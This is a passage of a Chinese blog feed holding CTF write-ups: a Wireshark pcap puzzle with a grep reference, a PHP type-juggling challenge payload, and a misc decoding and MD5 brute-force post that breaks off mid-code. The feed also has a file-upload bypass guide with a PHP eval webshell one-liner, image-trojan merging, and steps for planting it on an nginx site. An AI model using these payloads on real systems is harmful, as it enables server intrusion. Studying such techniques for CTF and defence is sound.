    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>wireshark 一般隐藏数据的方式有两种，一种是文件直接藏在压缩包里面需要导出，另一种是密码分段藏在数据包的一些字段里，需要拼接。这道题都用到了，还用到了Linux的一些命令，感觉质量很高。</p><span id="more"></span><h2 id="寻找隐藏的压缩包"><a href="#寻找隐藏的压缩包" class="headerlink" title="寻找隐藏的压缩包"></a>寻找隐藏的压缩包</h2><p>http是超文本传输协议，传送的数据都在这里面，所以过滤http,根据习惯我们找找zip，于是显示过滤器里面输入http contains “zip”,试了无数次，就是找不到，后来无意间尝试了ctrl+f5，跳出了另一个过滤器在右上角，这个过滤器里面有字符串的选项，勾选好然后直接输入zip，立马就跳到了key.zip那个数据包，真的是柳暗花明。<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pwhwmisc1.png" alt="image"><br>右键追踪数据流，改成原始数据，保存为一个文件，然后用hex编辑器去掉压缩包前面的部分再保存就行了。得到了一个秘钥（最基本的导出方法，不多解释）。</p><h2 id="寻找另一个线索"><a href="#寻找另一个线索" class="headerlink" title="寻找另一个线索"></a>寻找另一个线索</h2><p>再看看有什么信息，发现得到压缩包时请求的是一个叫做key.hacker.com的二级域名，很特殊，如下图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pwhwmisc2.png" alt="image"><br>所以想把所有有关这个主域名的请求都过滤出来。先回到最初的页面（左上角轻控股回车）然后用右上角的那个过滤器如下图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pwhwmisc3.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pwhwmisc4.png" alt="image"><br>有两个ip一个是192.168.236.2另一个是192.168.236.145很明显145写着no such name 也就是请求无效的意思，所以确定是192.168.236.2。而且发现这个子域名的奇怪之处，都是由四位数字字母组成的，且字母不超过f，第一感觉就是16进制，看来要拼接。接下来用左上角的过滤器，老方法，ip.dst&#x3D;&#x3D;192.168.236.2，然后到处特定分组为另一个pcap，这里命名为qweqwe.pcap。</p><h2 id="拼接字符串"><a href="#拼接字符串" class="headerlink" title="拼接字符串"></a>拼接字符串</h2><p>这里涉及到linux的 strings grep 和 tr的操作参考的是以下链接（官方推荐）<br><a href="http://blog.csdn.net/u011500307/article/details/25838075"></a><br>命令如图<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pwhwmisc5.png" alt="image"></p><p>结果<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pwhwmisc6.png" alt="image"><br>当然这里面有一个比较大的问题是重复，有些是多余的，需要移除，目前没有想到什么比较智能的方法<br>真实的结果是</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">56544</span>a<span class="hljs-number">4763325248566</span>d<span class="hljs-number">74594</span>d<span class="hljs-number">5374704e464</span>d<span class="hljs-number">78633239706369395356445</span>a<span class="hljs-number">7462335254536</span>d<span class="hljs-number">526e54464644527</span>a<span class="hljs-number">564e576</span><span class="hljs-keyword">c</span><span class="hljs-number">526</span><span class="hljs-keyword">c</span><span class="hljs-number">6247396e636</span>b<span class="hljs-number">56505153746</span>f<span class="hljs-number">6545354</span>d<span class="hljs-number">57455644624849345755706</span>f<span class="hljs-number">5957783159773</span>d<span class="hljs-number">3</span>d<br></code></pre></td></tr></table></figure><p>大家有什么方法和思路欢迎在下方评论交流</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最后就是hex转字符串，再base64解码，在用之前的秘钥解密AES</p><h2 id="补充一些知识"><a href="#补充一些知识" class="headerlink" title="补充一些知识"></a>补充一些知识</h2><h3 id="1-strings"><a href="#1-strings" class="headerlink" title="1.strings"></a>1.strings</h3><p> 打印文件中可打印的字符</p><h3 id="2-管道符"><a href="#2-管道符" class="headerlink" title="2.|管道符"></a>2.|管道符</h3><p>把前一个的输出作为后一个的输入</p><h3 id="3-grep"><a href="#3-grep" class="headerlink" title="3.grep"></a>3.grep</h3><p> Linux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。<br>1．命令格式：</p><p>grep [option] pattern file</p><p>2．命令功能：</p><p>用于过滤&#x2F;搜索的特定字符。可使用正则表达式能多种命令配合使用，使用上十分灵活。</p><p>3．命令参数：</p><p>-a   –text   #不要忽略二进制的数据。   </p><p>-A&lt;显示行数&gt;   –after-context&#x3D;&lt;显示行数&gt;   #除了显示符合范本样式的那一列之外，并显示该行之后的内容。   </p><p>-b   –byte-offset   #在显示符合样式的那一行之前，标示出该行第一个字符的编号。   </p><p>-B&lt;显示行数&gt;   –before-context&#x3D;&lt;显示行数&gt;   #除了显示符合样式的那一行之外，并显示该行之前的内容。   </p><p>-c    –count   #计算符合样式的列数。   </p><p>-C&lt;显示行数&gt;    –context&#x3D;&lt;显示行数&gt;或-&lt;显示行数&gt;   #除了显示符合样式的那一行之外，并显示该行之前后的内容。   </p><p>-d &lt;动作&gt;      –directories&#x3D;&lt;动作&gt;   #当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。   </p><p>-e&lt;范本样式&gt;  –regexp&#x3D;&lt;范本样式&gt;   #指定字符串做为查找文件内容的样式。   </p><p>-E      –extended-regexp   #将样式为延伸的普通表示法来使用。   </p><p>-f&lt;规则文件&gt;  –file&#x3D;&lt;规则文件&gt;   #指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。   </p><p>-F   –fixed-regexp   #将样式视为固定字符串的列表。   </p><p>-G   –basic-regexp   #将样式视为普通的表示法来使用。   </p><p>-h   –no-filename   #在显示符合样式的那一行之前，不标示该行所属的文件名称。   </p><p>-H   –with-filename   #在显示符合样式的那一行之前，表示该行所属的文件名称。   </p><p>-i    –ignore-case   #忽略字符大小写的差别。   </p><p>-l    –file-with-matches   #列出文件内容符合指定的样式的文件名称。   </p><p>-L   –files-without-match   #列出文件内容不符合指定的样式的文件名称。   </p><p>-n   –line-number   #在显示符合样式的那一行之前，标示出该行的列数编号。   </p><p>-q   –quiet或–silent   #不显示任何信息。   </p><p>-r   –recursive   #此参数的效果和指定“-d recurse”参数相同。   </p><p>-s   –no-messages   #不显示错误信息。   </p><p>-v   –revert-match   #显示不包含匹配文本的所有行。   </p><p>-V   –version   #显示版本信息。   </p><p>-w   –word-regexp   #只显示全字符合的列。   </p><p>-x    –line-regexp   #只显示全列符合的列。   </p><p>-y   #此参数的效果和指定“-i”参数相同。</p><p>4．规则表达式：</p><p>grep的规则表达式:</p><p>^  #锚定行的开始 如：’^grep’匹配所有以grep开头的行。    </p><p>$  #锚定行的结束 如：’grep$’匹配所有以grep结尾的行。    </p><p>.  #匹配一个非换行符的字符 如：’gr.p’匹配gr后接一个任意字符，然后是p。    </p><ul><li>#匹配零个或多个先前字符 如：’*grep’匹配所有一个或多个空格后紧跟grep的行。</li></ul><p>.*   #一起用代表任意字符。   </p><p>[]   #匹配一个指定范围内的字符，如’[Gg]rep’匹配Grep和grep。    </p><p>[^]  #匹配一个不在指定范围内的字符，如：’[^A-FH-Z]rep’匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    </p><p>(..)  #标记匹配字符，如’(love)‘，love被标记为1。    </p><p>&lt;      #锚定单词的开始，如:’&lt;grep’匹配包含以grep开头的单词的行。    </p><p>&gt;      #锚定单词的结束，如’grep&gt;‘匹配包含以grep结尾的单词的行。    </p><p>x{m}  #重复字符x，m次，如：’0{5}‘匹配包含5个o的行。    </p><p>x{m,}  #重复字符x,至少m次，如：’o{5,}‘匹配至少有5个o的行。    </p><p>x{m,n}  #重复字符x，至少m次，不多于n次，如：’o{5,10}‘匹配5–10个o的行。   </p><p>\w    #匹配文字和数字字符，也就是[A-Za-z0-9]，如：’G\w*p’匹配以G后跟零个或多个文字或数字字符，然后是p。   </p><p>\W    #\w的反置形式，匹配一个或多个非单词字符，如点号句号等。   </p><p>\b    #单词锁定符，如: ‘\bgrep\b’只匹配grep。  </p><p>POSIX字符:</p><p>为了在不同国家的字符编码中保持一至，POSIX(The Portable Operating System Interface)增加了特殊的字符类，如[:alnum:]是[A-Za-z0-9]的另一个写法。要把它们放到[]号内才能成为正则表达式，如[A- Za-z0-9]或[[:alnum:]]。在linux下的grep除fgrep外，都支持POSIX的字符类。</p><p>[:alnum:]    #文字数字字符   </p><p>[:alpha:]    #文字字符   </p><p>[:digit:]    #数字字符   </p><p>[:graph:]    #非空字符（非空格、控制字符）   </p><p>[:lower:]    #小写字符   </p><p>[:cntrl:]    #控制字符   </p><p>[:print:]    #非空字符（包括空格）   </p><p>[:punct:]    #标点符号   </p><p>[:space:]    #所有空白字符（新行，空格，制表符）   </p><p>[:upper:]    #大写字符   </p><p>[:xdigit:]   #十六进制数字（0-9，a-f，A-F）  </p><p>5．使用实例：</p><p>实例1：查找指定进程</p><p>命令：</p><p>ps -ef|grep svn</p><p>输出：</p><p>[root@localhost ~]# ps -ef|grep svn</p><p>root 4943   1      0  Dec05 ?   00:00:00 svnserve -d -r &#x2F;opt&#x2F;svndata&#x2F;grape&#x2F;</p><p>root 16867 16838  0 19:53 pts&#x2F;0    00:00:00 grep svn</p><p>[root@localhost ~]#</p><p>说明：</p><p>第一条记录是查找出的进程；第二条结果是grep进程本身，并非真正要找的进程。</p><p>实例2：查找指定进程个数</p><p>命令：</p><p>ps -ef|grep svn -c</p><p>ps -ef|grep -c svn</p><p>输出：</p><p>[root@localhost ~]# ps -ef|grep svn -c</p><p>2</p><p>[root@localhost ~]# ps -ef|grep -c svn </p><p>2</p><p>[root@localhost ~]#</p><p>说明：</p><p>实例3：从文件中读取关键词进行搜索</p><p>命令：</p><p>cat test.txt | grep -f test2.txt</p><p>输出：</p><p>[root@localhost test]# cat test.txt </p><p>hnlinux</p><p>peida.cnblogs.com</p><p>ubuntu</p><p>ubuntu linux</p><p>redhat</p><p>Redhat</p><p>linuxmint</p><p>[root@localhost test]# cat test2.txt </p><p>linux</p><p>Redhat</p><p>[root@localhost test]# cat test.txt | grep -f test2.txt</p><p>hnlinux</p><p>ubuntu linux</p><p>Redhat</p><p>linuxmint</p><p>[root@localhost test]#</p><p>说明：</p><p>输出test.txt文件中含有从test2.txt文件中读取出的关键词的内容行</p><p>实例3：从文件中读取关键词进行搜索 且显示行号</p><p>命令：</p><p>cat test.txt | grep -nf test2.txt</p><p>输出：</p><p>[root@localhost test]# cat test.txt </p><p>hnlinux</p><p>peida.cnblogs.com</p><p>ubuntu</p><p>ubuntu linux</p><p>redhat</p><p>Redhat</p><p>linuxmint</p><p>[root@localhost test]# cat test2.txt </p><p>linux</p><p>Redhat</p><p>[root@localhost test]# cat test.txt | grep -nf test2.txt</p><p>1:hnlinux</p><p>4:ubuntu linux</p><p>6:Redhat</p><p>7:linuxmint</p><p>[root@localhost test]#</p><p>说明：</p><p>输出test.txt文件中含有从test2.txt文件中读取出的关键词的内容行，并显示每一行的行号</p><p>实例5：从文件中查找关键词</p><p>命令：</p><p>grep ‘linux’ test.txt</p><p>输出：</p><p>[root@localhost test]# grep ‘linux’ test.txt </p><p>hnlinux</p><p>ubuntu linux</p><p>linuxmint</p><p>[root@localhost test]# grep -n ‘linux’ test.txt </p><p>1:hnlinux</p><p>4:ubuntu linux</p><p>7:linuxmint</p><p>[root@localhost test]#</p><p>说明：</p><p>实例6：从多个文件中查找关键词</p><p>命令：</p><p>grep ‘linux’ test.txt test2.txt</p><p>输出：</p><p>[root@localhost test]# grep -n ‘linux’ test.txt test2.txt </p><p>test.txt:1:hnlinux</p><p>test.txt:4:ubuntu linux</p><p>test.txt:7:linuxmint</p><p>test2.txt:1:linux</p><p>[root@localhost test]# grep ‘linux’ test.txt test2.txt </p><p>test.txt:hnlinux</p><p>test.txt:ubuntu linux</p><p>test.txt:linuxmint</p><p>test2.txt:linux</p><p>[root@localhost test]#</p><p>说明：</p><p>多文件时，输出查询到的信息内容行时，会把文件的命名在行最前面输出并且加上”:”作为标示符</p><p>实例7：grep不显示本身进程</p><p>命令：</p><p>ps aux|grep [s]sh</p><p>ps aux | grep ssh | grep -v “grep”</p><p>输出：</p><p>[root@localhost test]# ps aux|grep ssh</p><p>root   2720  0.0  0.0  62656  1212 ?      Ss   Nov02   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd</p><p>root  16834  0.0  0.0  88088  3288 ?      Ss   19:53   0:00 sshd: root@pts&#x2F;0 </p><p>root  16901  0.0  0.0  61180   764 pts&#x2F;0  S+   20:31   0:00 grep ssh</p><p>[root@localhost test]# ps aux|grep [s]sh]</p><p>[root@localhost test]# ps aux|grep [s]sh</p><p>root   2720  0.0  0.0  62656  1212 ?      Ss   Nov02   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd</p><p>root  16834  0.0  0.0  88088  3288 ?      Ss   19:53   0:00 sshd: root@pts&#x2F;0 </p><p>[root@localhost test]# ps aux | grep ssh | grep -v “grep”</p><p>root   2720  0.0  0.0  62656  1212 ?      Ss   Nov02   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd</p><p>root  16834  0.0  0.0  88088  3288 ?      Ss   19:53   0:00 sshd: root@pts&#x2F;0</p><p>说明：</p><p>实例8：找出已u开头的行内容</p><p>命令：</p><p>cat test.txt |grep ^u</p><p>输出：</p><p>[root@localhost test]# cat test.txt |grep ^u</p><p>ubuntu</p><p>ubuntu linux</p><p>[root@localhost test]#</p><p>说明：</p><p>实例9：输出非u开头的行内容</p><p>命令：</p><p>cat test.txt |grep ^[^u]</p><p>输出：</p><p>[root@localhost test]# cat test.txt |grep ^[^u]</p><p>hnlinux</p><p>peida.cnblogs.com</p><p>redhat</p><p>Redhat</p><p>linuxmint</p><p>[root@localhost test]#</p><p>说明：</p><p>实例10：输出以hat结尾的行内容</p><p>命令：</p><p>cat test.txt |grep hat$</p><p>输出：</p><p>[root@localhost test]# cat test.txt |grep hat$</p><p>redhat</p><p>Redhat</p><p>[root@localhost test]#</p><p>说明：</p><p>实例11：输出ip地址</p><p>命令：</p><pre><code class="hljs"> ifconfig eth0|grep -E &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&quot;</code></pre><p>输出：</p><p>[root@localhost test]# ifconfig eth0|grep “[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}“</p><pre><code class="hljs">      inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0</code></pre><p>[root@localhost test]# ifconfig eth0|grep -E “([0-9]{1,3}.){3}[0-9]”</p><pre><code class="hljs">      inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0</code></pre><p>[root@localhost test]#</p><p>说明：</p><p>实例12：显示包含ed或者at字符的内容行</p><p>命令：</p><p>cat test.txt |grep -E “ed|at”</p><p>输出：</p><p>[root@localhost test]# cat test.txt |grep -E “peida|com”</p><p>peida.cnblogs.com</p><p>[root@localhost test]# cat test.txt |grep -E “ed|at”</p><p>redhat</p><p>Redhat</p><p>[root@localhost test]#</p><p>说明：</p><p>实例13：显示当前目录下面以.txt 结尾的文件中的所有包含每个字符串至少有7个连续小写字符的字符串的行</p><p>命令：</p><p>grep ‘[a-z]{7}‘ *.txt</p><p>输出：</p><p>[root@localhost test]# grep ‘[a-z]{7}‘ *.txt</p><p>test.txt:hnlinux</p><p>test.txt:peida.cnblogs.com</p><p>test.txt:linuxmint</p><p>[root@localhost test]#</p><p>实例14:日志文件过大，不好查看，我们要从中查看自己想要的内容，或者得到同一类数据，比如说没有404日志信息的</p><p>命令：</p><p>grep ‘.’ access1.log|grep -Ev ‘404’ &gt; access2.log</p><p>grep ‘.’ access1.log|grep -Ev ‘(404|&#x2F;photo&#x2F;|&#x2F;css&#x2F;)’ &gt; access2.log</p><p>grep ‘.’ access1.log|grep -E ‘404’ &gt; access2.log</p><p>输出：</p><p>[root@localhost test]# grep “.”access1.log|grep -Ev “404” &gt; access2.log</p><p>说明：上面3句命令前面两句是在当前目录下对access1.log文件进行查找，找到那些不包含404的行，把它们放到access2.log中,后面去掉’v’,即是把有404的行放入access2.log</p><h3 id="4-tr"><a href="#4-tr" class="headerlink" title="4.tr"></a>4.tr</h3><p>tr命令可以对来自标准输入的字符进行替换、压缩和删除。它可以将一组字符变成另一组字符，经常用来编写优美的单行命令，作用很强大</p><p>参数:<br><br>-c或——complerment：取代所有不属于第一字符集的字符；<br><br>-d或——delete：删除所有属于第一字符集的字符； <br><br>-s或–squeeze-repeats：把连续重复的字符以单独一个字符表示；<br><br>-t或–truncate-set1：先删除第一字符集较第二字符集多出的字符。<br></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>pwnhub题目的质量还是相当高的，很多奇淫技巧有待发掘，以后要多多关注。</p><p>本文的参考链接：<br><a href="http://blog.csdn.net/u011500307/article/details/25838075"></a><br><a href="http://www.cnblogs.com/ITtangtang/p/3950497.html"></a><br><a href="http://man.linuxde.net/tr"></a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的文件上传绕过技巧</title>
    <link href="/2017/05/30/passupload/"/>
    <url>/2017/05/30/passupload/</url>
    
    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>文件上传漏洞在各大ctf中很常见，在平时的攻防中也不可小觑，现在拿出来总结一下。</p><h2 id="js验证绕过"><a href="#js验证绕过" class="headerlink" title="js验证绕过"></a>js验证绕过</h2><p>方法一：<br>直接禁用js,万事大吉。<br>讲一下火狐浏览器禁用的方法：在地址栏输入 about:config回车<br>搜索 javascript.enabled 右键切换就可以了。用完了记得切换回来偶。</p><span id="more"></span><p>方法二：<br>查看元素，直接把js验证的函数删掉，不让他调用就可以了</p><p>方法三：<br>bp抓包改包，因为bp截的是js验证之后发到服务器的包，所以上传时一定要把不合法的后缀改成合法的，然后抓包改回来，改回来的目的是让文件的最终存储方式为你想要的。</p><p>方法四： 可能js只是检测了第一个点号后面的后缀，而忽略了我们可能加上去的第二个点号构造 1.jpg.php上传<br>附上一段检验js</p><pre><code class="hljs">function check()&#123;var filename=document.getElementById(&quot;file&quot;);var str=filename.value.split(&quot;.&quot;);var ext=str[1];if(ext===&#39;jpg&#39;)&#123;return true;&#125;else&#123;  alert(&quot;请上传一张JPG格式的图片！&quot;);return false; &#125;return false;&#125;</code></pre><h2 id="服务器端文件后缀名检测"><a href="#服务器端文件后缀名检测" class="headerlink" title="服务器端文件后缀名检测"></a>服务器端文件后缀名检测</h2><p>因为只有服务器这道卡，所以必须在服务器的解析上动手脚。</p><p>方法一： bp改后缀名大小写混合，利用windows服务器对大小写不敏感，用样可以解析。</p><p>方法二： bp改后缀，在最后加上空格，点号，下划线或者特殊后缀php5、php4啥的</p><p>方法三： bp改后缀，直接双写</p><p>方法四： 查找黑名单遗漏的依然能解析的后缀，比如.asa .cer .cdx</p><p>方法五： IIS6.0文件解析漏洞分为两种,主要利用第二个</p><p>1)只要存在一个以.asp或.asa结尾的文件夹，里面的文件不管是什么后缀都能作为asp解析.(这个用在上传后根据时间自动命名的情况，因为这种情况第二个漏洞用不了)</p><p>2）分号后面不被解析 改包为sp.asp;.jpg </p><p>方法六： apache 解析漏洞，利用apache从右到左解析后缀，碰见不认识的就再往前的特性，构造test.php.xyz</p><p>方法七： %00截断</p><p>这个分为两种类型，文件名截断和路径截断</p><p>1.文件名截断:</p><p>如果两次对文件后缀名的检测有差异的话，就会造成这样的漏洞，比如说第一次是检测最后一个点号后面的，发现是图片格式，满足条件。第二次把图片存储进去，%00起了作用，变成了php存进去了</p><p>2.文件路径截断</p><p>这种情况下抓包有一个&#x2F;uploads文件夹，等会上传上去文件名会并在后面，也就是说上传的数据流会以uploads&#x2F;后面跟的文件格式存储uploads&#x2F;&amp;filename 如果我们在uoloads&#x2F;muma.php%00那么待会&amp;filename会被截断，数据流最终会以muma.php格式存储在服务器上。<br>就会自动到了%00后面，读取的时候被截断</p><p>方法八： IIS7.0畸形解析漏洞</p><p>先合并一张PHP一句话图片马，合并方法：<br>①、DOS合并：copy 1.gif &#x2F;b + 1.txt&#x2F;a asp.gif<br>②、用edjpgcom，进行图片和一句话木马的合并，一句话代码为”<?fputs(fopen("shell.PHP","w"),"<?eval($_POST[akt]);?>“)?&gt;”<br>图片随便找一张.<br>一句话:<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[akt])?>‘);?&gt;<br>然后找个nginx的站,先注册一个用户然后在论坛上传一张我们刚刚合并的图片一句话马。<br>找到图片地址,然后在地址后面加个shell.php，在浏览器中运行。<br>比如假设图片地址为 <a href="http://www.xxx.com/tupian/1.jpg">www.xxx.com/tupian/1.jpg</a><br>则执行地址为 <a href="http://www.xxx.com/tupian/1.jpg/shell.php">www.xxx.com/tupian/1.jpg/shell.php</a><br>然后,会在目录下生成shell.php。比如: <a href="http://www.xxx.com/tupian/shell.php">www.xxx.com/tupian/shell.php</a><br>shell.php就是我们的一句话地址。再拿一句话的客户端连接这个一句话地址就好。</p><p>方法九：当遇见随机命名时，除了利用文件夹解析漏洞外，还可以抓包，本来filepath后面的内容是upfile，我们改成upfile.asp，相当于创建了一个.asp的文件夹，或者在upfile&#x2F;后加上xx.asp，这样上传的文件就是asp结尾的了。</p><p>方法十：conten-type 决定服务器将用什么方式去读取编码得到的文件，可以把php的content-type 改成 image&#x2F;jpeg</p><h2 id="服务器文件头检测"><a href="#服务器文件头检测" class="headerlink" title="服务器文件头检测"></a>服务器文件头检测</h2><pre><code class="hljs">构造假的文件头GIF89a  &lt;head&gt;  &lt;meta http-equiv = &quot;refresh&quot; content = &quot;1; url=http://www.***.com/&quot; /&gt;  &lt;/head&gt;  </code></pre>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iscc 2017 ctf 自相矛盾 详细分析</title>
    <link href="/2017/05/29/iscc%20ctf%202017%20%E8%87%AA%E7%9B%B8%E7%9F%9B%E7%9B%BE%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <url>/2017/05/29/iscc%20ctf%202017%20%E8%87%AA%E7%9B%B8%E7%9F%9B%E7%9B%BE%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>iscc2017有几道PHP题目还是有点意思，虽然是为了出题而出题但是知识点考察还是很全面的，这道感觉毁了三观的一道题真的有那么难吗？我们细细分析。</p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>源码如下：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%87%AA%E7%9B%B8%E7%9F%9B%E7%9B%BE%E6%BA%90%E7%A0%81.png" alt="image"><br>首先我们看到的就是需要传入一个名字叫做iscc的json对象,然后会被转化成数组。至于json对象，长成啥样就像这样：<br>{“a”:1,”b”:2,”c”:3,”d”:4,”e”:5}，待会数组打印出来冒号前面的就是键，冒号后面就是值。本地测试一下如图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%87%AA%E7%9B%B8%E7%9F%9B%E7%9B%BE2.png" alt="image"><br>后面的代码分成三个部分，分别对应三个变量</p><p>1.数组a中的bar1键对应的值要不是数字，但是值要比2016大，这里用的是php比较中的一个问题，字符串和数字比较时系统会把字符串转化成intval类型，如： ‘12asd’会被转化成12 ‘a’会转化成0 ，所以这里面直接构造bar1是2017a</p><p>2.bar2键要是一个数组，长度是5，并且数组中的第一个元素还要是数组，难点在下面，数组中的值需要有nudt但是有要没有，这里用到了array_search<br>的一个弱类型比较问题，array_search的查找相当于&#x3D;&#x3D;也就是说只要里面有0就可以绕过，所以构造 bar2为 [[0],0,1,2,3]</p><p>3.传入的cat可以是一个数组或者字符串，但是后面的矛盾再次说明要利用strcmp的漏洞，所以必须是数组，strcmp如果数组和字符串比较返回值一定是0也就是假，也说明d是字符串。先看最后一个条件，说明d和c[0]里面一定有一个含有isccctf2017，但是回到上一个条件，两个里面不能有3或1或c<br>想到了eregi的%00截断漏洞c[0]&#x3D;isccctf2017 d&#x3D;%00,构造这样的语句：<br>&amp;cat[0]&#x3D;isccctf2017&amp;cat[1][]&#x3D;1&amp;dog&#x3D;%00</p><p>综合起来就是iscc&#x3D;{“bar1”:”2017a”,”bar2”:”[[0],0,1,2,3]”}&amp;cat[0]&#x3D;isccctf2017&amp;cat[1][]&#x3D;1&amp;dog&#x3D;%00</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验吧 安全杂项 中等难度题目 writeup</title>
    <link href="/2017/05/29/shiyanba%20misc%20writeup/"/>
    <url>/2017/05/29/shiyanba%20misc%20writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>突然想把实验吧一些好的难度又不是特别大的misc整理一下，与大家共享</p><h2 id="ROT-13-变身了"><a href="#ROT-13-变身了" class="headerlink" title="ROT-13 变身了"></a>ROT-13 变身了</h2><p>拿到的是一串数字 第一反应就是10进制转字符串</p><span id="more"></span><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=&#x27;<span class="hljs-number">83</span> <span class="hljs-number">89</span> <span class="hljs-number">78</span> <span class="hljs-number">84</span> <span class="hljs-number">45</span> <span class="hljs-number">86</span> <span class="hljs-number">96</span> <span class="hljs-number">45</span> <span class="hljs-number">115</span> <span class="hljs-number">121</span> <span class="hljs-number">110</span> <span class="hljs-number">116</span> <span class="hljs-number">136</span> <span class="hljs-number">132</span> <span class="hljs-number">132</span> <span class="hljs-number">132</span> <span class="hljs-number">108</span> <span class="hljs-number">128</span> <span class="hljs-number">117</span> <span class="hljs-number">118</span> <span class="hljs-number">134</span> <span class="hljs-number">110</span> <span class="hljs-number">123</span> <span class="hljs-number">111</span> <span class="hljs-number">110</span> <span class="hljs-number">127</span> <span class="hljs-number">108</span> <span class="hljs-number">112</span> <span class="hljs-number">124</span> <span class="hljs-number">122</span> <span class="hljs-number">108</span> <span class="hljs-number">118</span> <span class="hljs-number">128</span> <span class="hljs-number">108</span> <span class="hljs-number">131</span> <span class="hljs-number">114</span> <span class="hljs-number">127</span> <span class="hljs-number">134</span> <span class="hljs-number">108</span> <span class="hljs-number">116</span> <span class="hljs-number">124</span> <span class="hljs-number">124</span> <span class="hljs-number">113</span> <span class="hljs-number">108</span> <span class="hljs-number">76</span> <span class="hljs-number">76</span> <span class="hljs-number">76</span> <span class="hljs-number">76</span> <span class="hljs-number">138</span> <span class="hljs-number">23</span> <span class="hljs-number">90</span> <span class="hljs-number">81</span> <span class="hljs-number">66</span> <span class="hljs-number">71</span> <span class="hljs-number">64</span> <span class="hljs-number">69</span> <span class="hljs-number">114</span> <span class="hljs-number">65</span> <span class="hljs-number">112</span> <span class="hljs-number">64</span> <span class="hljs-number">66</span> <span class="hljs-number">63</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> <span class="hljs-number">70</span> <span class="hljs-number">114</span> <span class="hljs-number">62</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">67</span> <span class="hljs-number">70</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">110</span> <span class="hljs-number">110</span> <span class="hljs-number">112</span> <span class="hljs-number">64</span> <span class="hljs-number">68</span> <span class="hljs-number">62</span> <span class="hljs-number">70</span> <span class="hljs-number">61</span> <span class="hljs-number">112</span> <span class="hljs-number">111</span> <span class="hljs-number">112</span>&#x27;<br><span class="hljs-attribute">a</span>=a.split(&#x27; &#x27;)<br><span class="hljs-attribute">b</span>=[chr(int(i)-<span class="hljs-number">13</span>) for i in a]<br><span class="hljs-attribute">b</span>=&#x27;&#x27;.join(b)<br><span class="hljs-attribute">print</span> b<br></code></pre></td></tr></table></figure><p>得到一串<br>FLAG IS flag{www_shiyanbar_com_is_very_good_????}<br>MD5:38e4c352809e150186920aac37190cbc<br>接下来便是四位的爆破匹配md5值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>m=<span class="hljs-string">&#x27;38e4c352809e150186920aac37190cbc&#x27;</span><br>c=<span class="hljs-string">r&quot;&quot;&quot;@#$%^&amp;*()_+-=&#123;&#125;[]|\:;&quot;&#x27;&lt;&gt;?,.`~!/9876543210ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compare</span>():<br>    <span class="hljs-keyword">for</span> i <span 